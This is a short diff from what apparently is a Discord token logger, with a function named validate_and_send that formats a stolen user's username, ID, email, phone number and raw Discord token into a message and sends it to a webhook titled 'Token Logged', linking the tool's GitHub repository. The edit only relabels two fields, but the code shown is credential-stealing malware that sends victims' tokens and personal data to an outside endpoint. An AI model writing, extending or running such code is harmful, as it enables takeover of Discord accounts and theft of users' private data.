@@ -145,10 +145,10 @@ def validate_and_send(tokens):
                 msg = (
                     f"🧑 **Discord Username**: `{user['username']}#{user['discriminator']}`\n"
                     f"🆔 **User ID**: `{user_id}`\n"
-                    f"📧 **Email**: `{user.get('email', 'N/A')}`\n"
+                    f"📧 **Discord Email**: `{user.get('email', 'N/A')}`\n"
                     f"📱 **Phone Number**: `{user.get('phone', 'N/A')}`\n"
                     f"🔑 **Discord Token**: `{token}`\n"
-                    f"🐙 **GitHub:** https://github.com/deadconvicess/Discord-Token-Logger"
+                    f"🐙 **GitHub** https://github.com/deadconvicess/Discord-Token-Logger"
                 )
                 send_webhook(msg, title="Token Logged")
         except Exception as e:
